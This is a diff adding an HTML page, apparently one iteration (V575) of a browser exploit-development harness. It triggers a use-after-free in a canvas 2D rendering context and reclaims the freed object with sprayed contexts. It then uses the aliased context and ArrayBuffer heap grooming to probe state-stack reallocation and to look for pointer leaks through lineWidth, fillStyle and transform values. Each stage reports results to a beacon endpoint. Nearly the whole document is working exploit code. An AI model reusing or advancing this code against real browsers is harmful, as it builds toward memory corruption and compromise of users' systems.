@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V575</title></head>
+<body><pre id="out">V575 — save/restore interleave + stateStack realloc diagnostic</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V575-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+var f64buf=new Float64Array(1);
+var u32buf=new Uint32Array(f64buf.buffer);
+function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
+function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function dblHex(d){var b=dblBits(d);return'0x'+hex8(b.hi)+hex8(b.lo);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY);
+say('BOOT: saves='+NSAVES+' spray='+NSPRAY);
+
+/* ===== PHASE 1: UAF + same-type reclaim (V573 proven) ===== */
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+bk('PRE-UAF','triggering');
+var outerC=triggerUAF();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+
+var MARKER=7777.77;
+var sprayCtxs=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas');sc.width=1;sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){sctx.lineWidth=MARKER;sprayCtxs.push(sctx);}
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+var lw0;
+try{lw0=innerCtx.lineWidth;}catch(e){bk('DEAD','lw-crash');throw e;}
+if(lw0!==MARKER){bk('NO-RECLAIM','lw='+lw0);say('No reclaim');throw new Error('no reclaim');}
+bk('RECLAIM','OK');
+say('Reclaim confirmed, lineWidth='+MARKER);
+
+var A=innerCtx;
+
+/* Find the REAL alias — scan for which spray ctx shares our object */
+A.lineWidth=9999.99;
+var aliasIdx=-1;
+for(var i=0;i<sprayCtxs.length;i++){
+  if(sprayCtxs[i].lineWidth===9999.99){aliasIdx=i;break;}
+}
+A.lineWidth=MARKER;
+bk('ALIAS','idx='+aliasIdx);
+say('Alias found at spray index '+aliasIdx);
+if(aliasIdx<0){bk('NO-ALIAS','scan-failed');say('No alias found!');throw new Error('no alias');}
+var B=sprayCtxs[aliasIdx];
+
+/* ===== TEST 1: m_unrealizedSaveCount interleave ===== */
+bk('T1-START','unrealizedSaveCount-interleave');
+say('\n--- TEST 1: save/restore interleave ---');
+
+/* Baseline: A.save(5), A.restore(5) — normal round-trip */
+A.lineWidth=111.0;
+for(var i=0;i<5;i++) A.save();
+A.lineWidth=222.0;
+for(var i=0;i<5;i++) A.restore();
+var t1a=A.lineWidth;
+bk('T1-BASELINE','after-5save-5restore='+t1a);
+say('T1 baseline: 5save+5restore → lw='+t1a+' (expect 111)');
+
+/* Interleave: A.save(5), B triggers realize, B.restore(3), A.restore(?) */
+A.lineWidth=333.0;
+for(var i=0;i<5;i++) A.save();       // unrealizedCount = 5
+B.lineWidth=444.0;                     // realize: push 5, counter=0, stack=6, top.lw=444
+bk('T1-AFTER-REALIZE','B.lw='+B.lineWidth+',A.lw='+A.lineWidth);
+say('T1 after realize: A.lw='+A.lineWidth+' B.lw='+B.lineWidth);
+
+B.restore(); B.restore(); B.restore(); // pop 3 → stack=3
+bk('T1-AFTER-BPOP3','B.lw='+B.lineWidth+',A.lw='+A.lineWidth);
+say('T1 after B.restore×3: A.lw='+A.lineWidth+' B.lw='+B.lineWidth);
+
+/* Now A tries to restore 5 times — but only 2 real entries above base remain */
+var t1_restores=0;
+for(var i=0;i<5;i++){
+  var before=A.lineWidth;
+  try{A.restore();t1_restores++;}catch(e){bk('T1-RESTORE-ERR',e.message);break;}
+  var after=A.lineWidth;
+  bk('T1-ARESTORE-'+i,'before='+before+',after='+after);
+}
+bk('T1-FINAL','restores='+t1_restores+',A.lw='+A.lineWidth+',B.lw='+B.lineWidth);
+say('T1 final: '+t1_restores+' restores, A.lw='+A.lineWidth+' B.lw='+B.lineWidth);
+
+/* ===== TEST 2: stateStack growth measurement ===== */
+bk('T2-START','stateStack-growth');
+say('\n--- TEST 2: stateStack growth ---');
+
+/* Reset to known state */
+A.lineWidth=500.0;
+
+/* Grow the stack by saving many times through A, realize through B */
+var NSAVE2=100;
+for(var i=0;i<NSAVE2;i++) A.save();
+B.lineWidth=501.0;  // realize all 100
+bk('T2-GROW','saved='+NSAVE2+',realized-via-B');
+say('T2: saved '+NSAVE2+' via A, realized via B');
+
+/* Read lineWidth through both — should be same (501) */
+bk('T2-READ','A.lw='+A.lineWidth+',B.lw='+B.lineWidth);
+say('T2 top: A.lw='+A.lineWidth+' B.lw='+B.lineWidth);
+
+/* Restore all through B to shrink stack */
+for(var i=0;i<NSAVE2;i++) B.restore();
+bk('T2-SHRUNK','A.lw='+A.lineWidth+',B.lw='+B.lineWidth);
+say('T2 after B.restore×'+NSAVE2+': A.lw='+A.lineWidth+' B.lw='+B.lineWidth);
+
+/* ===== TEST 3: fillStyle forging diagnostic ===== */
+bk('T3-START','fillStyle-bits');
+say('\n--- TEST 3: fillStyle bits diagnostic ---');
+
+/* Write various colors, read back, check if any leak pointer-width data */
+var colors=['#000000','#ffffff','#ff0000','#00ff00','#0000ff','#deadbe','#c0ffee','#babe42'];
+for(var ci=0;ci<colors.length;ci++){
+  try{
+    A.fillStyle=colors[ci];
+    var got=A.fillStyle;
+    var gotB=B.fillStyle;
+    bk('T3-COLOR','set='+colors[ci]+',A='+got+',B='+gotB);
+  }catch(e){bk('T3-ERR',colors[ci]+':'+e.message);}
+}
+
+/* Write gradient through A, read through B — does it serialize differently? */
+try{
+  var g=A.createLinearGradient(0,0,100,100);
+  g.addColorStop(0,'red');g.addColorStop(1,'blue');
+  A.fillStyle=g;
+  var fsA=''+A.fillStyle;
+  var fsB=''+B.fillStyle;
+  bk('T3-GRAD','A='+fsA.slice(0,60)+',B='+fsB.slice(0,60));
+  say('T3 gradient: A='+fsA+' B='+fsB);
+}catch(e){bk('T3-GRAD-ERR',e.message);}
+
+/* Write pattern (if supported) through A */
+try{
+  var pc=document.createElement('canvas');pc.width=2;pc.height=2;
+  var pctx=pc.getContext('2d');pctx.fillStyle='red';pctx.fillRect(0,0,2,2);
+  var pat=A.createPattern(pc,'repeat');
+  A.fillStyle=pat;
+  var fsA2=''+A.fillStyle;
+  var fsB2=''+B.fillStyle;
+  bk('T3-PAT','A='+fsA2.slice(0,60)+',B='+fsB2.slice(0,60));
+  say('T3 pattern: A='+fsA2+' B='+fsB2);
+}catch(e){bk('T3-PAT-ERR',e.message);}
+
+/* ===== TEST 4: stateStack realloc + spray ===== */
+bk('T4-START','realloc-spray');
+say('\n--- TEST 4: stateStack realloc spray ---');
+
+/* Strategy: grow stack large (force big buffer), restore all (buffer stays),
+   grow again larger (old buffer freed, new bigger one allocated),
+   spray ABs into old buffer size class,
+   then read state entries that might overlap with AB data */
+
+A.lineWidth=600.0;
+var GROW1=50;
+for(var i=0;i<GROW1;i++) A.save();
+B.lineWidth=601.0; // realize 50 → stack=51, buffer ~ 51*448 = ~22KB
+bk('T4-GROW1','n='+GROW1+',lw='+A.lineWidth);
+
+/* Set distinct lineWidth in each state for tracking */
+for(var i=0;i<GROW1;i++){
+  B.restore();
+}
+bk('T4-SHRUNK1','lw='+A.lineWidth);
+
+/* Grow again larger → old buffer freed */
+var GROW2=200;
+for(var i=0;i<GROW2;i++) A.save();
+A.lineWidth=602.0; // realize 200 → stack=201, buffer ~ 201*448 = ~90KB (new allocation)
+bk('T4-GROW2','n='+GROW2+',lw='+A.lineWidth);
+
+/* Spray ABs into the ~22KB freed buffer's size class */
+var t4abs=[];
+var T4SIZE=GROW1*448; // ~22KB
+for(var i=0;i<50;i++){
+  try{
+    var ab=new ArrayBuffer(T4SIZE);
+    var dv=new DataView(ab);
+    for(var j=0;j<T4SIZE;j+=8){
+      dv.setFloat64(j,0xCAFEBABE+i,true);
+    }
+    t4abs.push(ab);
+  }catch(e){}
+}
+bk('T4-ABSPRAY','n='+t4abs.length+',size='+T4SIZE);
+
+/* Restore all 200 to shrink stack, read bottom states */
+for(var i=0;i<GROW2;i++) B.restore();
+var t4final=A.lineWidth;
+bk('T4-FINAL','lw='+t4final+',hex='+dblHex(t4final));
+say('T4 final: lw='+t4final+' hex='+dblHex(t4final));
+
+/* ===== TEST 5: transform as wide read ===== */
+bk('T5-START','transform-wide-read');
+say('\n--- TEST 5: transform wide read ---');
+
+/* setTransform writes 6 doubles (48 bytes) into State+112..+159 */
+A.setTransform(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
+var t5=A.getTransform();
+bk('T5-SET','a='+t5.a+',b='+t5.b+',c='+t5.c+',d='+t5.d+',e='+t5.e+',f='+t5.f);
+var t5B=B.getTransform();
+bk('T5-READB','a='+t5B.a+',b='+t5B.b+',c='+t5B.c+',d='+t5B.d+',e='+t5B.e+',f='+t5B.f);
+say('T5 transform: a='+t5.a+' b='+t5.b+' c='+t5.c+' d='+t5.d+' e='+t5.e+' f='+t5.f);
+
+/* Check if transform hex values contain anything pointer-like */
+var tx_vals=[t5.a,t5.b,t5.c,t5.d,t5.e,t5.f];
+var tx_hex='';
+for(var i=0;i<6;i++) tx_hex+=String.fromCharCode(97+i)+'='+dblHex(tx_vals[i])+' ';
+bk('T5-HEX',tx_hex);
+
+bk('DONE','complete');
+say('\nV575 complete.');
+</script>
+</body>
+</html>
